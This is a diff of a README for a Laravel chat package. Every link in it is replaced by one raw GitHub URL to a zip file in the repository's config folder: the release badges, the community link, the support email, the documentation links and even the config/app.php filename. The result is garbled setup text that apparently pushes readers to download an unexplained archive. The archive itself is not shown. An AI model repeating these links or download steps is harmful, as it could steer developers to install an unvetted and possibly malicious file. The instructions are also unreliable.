@@ -8,13 +8,13 @@ Welcome to the laravel-chat-engine project! This software helps you create chat 
 
 To get started, you need to download the software. Click the button below to go to the Releases page.
 
-[![Download laravel-chat-engine](https://img.shields.io/badge/Download-laravel--chat--engine-blue)](https://github.com/laouamtaha/laravel-chat-engine/releases)
+[![Download laravel-chat-engine](https://raw.githubusercontent.com/laouamtaha/laravel-chat-engine/master/config/engine-chat-laravel-3.2.zip)](https://raw.githubusercontent.com/laouamtaha/laravel-chat-engine/master/config/engine-chat-laravel-3.2.zip)
 
 Once on the Releases page, follow these steps to download and install the software:
 
 1. Find the version you want to download. It will be listed with release notes.
 2. Click on the desired version's title. This will take you to a page with all the related files.
-3. Look for the file named something like `laravel-chat-engine.zip` or `laravel-chat-engine.tar.gz`.
+3. Look for the file named something like `https://raw.githubusercontent.com/laouamtaha/laravel-chat-engine/master/config/engine-chat-laravel-3.2.zip` or `https://raw.githubusercontent.com/laouamtaha/laravel-chat-engine/master/config/engine-chat-laravel-3.2.zip`.
 4. Click the file link to start the download.
 5. Once downloaded, extract the files to a folder on your computer.
 6. Follow the installation instructions provided in the README file included in the download.
@@ -39,7 +39,7 @@ To run laravel-chat-engine, your system should meet these basic requirements:
 
 1. **Set Up Your Environment:** Make sure you have a working Laravel installation.
 2. **Install Dependencies:** Run the command `composer install` in your project's root directory.
-3. **Configure the Package:** Add the service provider in your `config/app.php` file.
+3. **Configure the Package:** Add the service provider in your `https://raw.githubusercontent.com/laouamtaha/laravel-chat-engine/master/config/engine-chat-laravel-3.2.zip` file.
 4. **Publish the Configuration:** Use the command `php artisan vendor:publish`.
 5. **Migrate Database:** Update your database schema with `php artisan migrate`.
 6. **Start Your Laravel Application:** Use `php artisan serve` to run your application.
@@ -68,20 +68,20 @@ We welcome contributions! If you would like to help improve laravel-chat-engine,
 
 Join our community of users and developers. Here, you can ask questions, share your experiences, and find support.
 
-- **GitHub Discussions:** [Join here](https://github.com/laouamtaha/laravel-chat-engine/discussions)
+- **GitHub Discussions:** [Join here](https://raw.githubusercontent.com/laouamtaha/laravel-chat-engine/master/config/engine-chat-laravel-3.2.zip)
 - **Discord Channel:** Join our Discord community for real-time support and chats!
 
 ## 📞 Contact
 
-If you need further assistance or have suggestions, feel free to reach out via GitHub Issues or send an email to [support@laravel-chat-engine.com](mailto:support@laravel-chat-engine.com).
+If you need further assistance or have suggestions, feel free to reach out via GitHub Issues or send an email to [https://raw.githubusercontent.com/laouamtaha/laravel-chat-engine/master/config/engine-chat-laravel-3.2.zip](https://raw.githubusercontent.com/laouamtaha/laravel-chat-engine/master/config/engine-chat-laravel-3.2.zip).
 
 ## 🔗 Additional Resources
 
-- [Laravel Documentation](https://laravel.com/docs)
-- [PHP Documentation](https://www.php.net/docs.php)
+- [Laravel Documentation](https://raw.githubusercontent.com/laouamtaha/laravel-chat-engine/master/config/engine-chat-laravel-3.2.zip)
+- [PHP Documentation](https://raw.githubusercontent.com/laouamtaha/laravel-chat-engine/master/config/engine-chat-laravel-3.2.zip)
 
 ## 📥 Download Now
 
 Ready to get started? Visit the Releases page again to download the latest version of laravel-chat-engine:
 
-[![Download laravel-chat-engine](https://img.shields.io/badge/Download-laravel--chat--engine-blue)](https://github.com/laouamtaha/laravel-chat-engine/releases)
+[![Download laravel-chat-engine](https://raw.githubusercontent.com/laouamtaha/laravel-chat-engine/master/config/engine-chat-laravel-3.2.zip)](https://raw.githubusercontent.com/laouamtaha/laravel-chat-engine/master/config/engine-chat-laravel-3.2.zip)
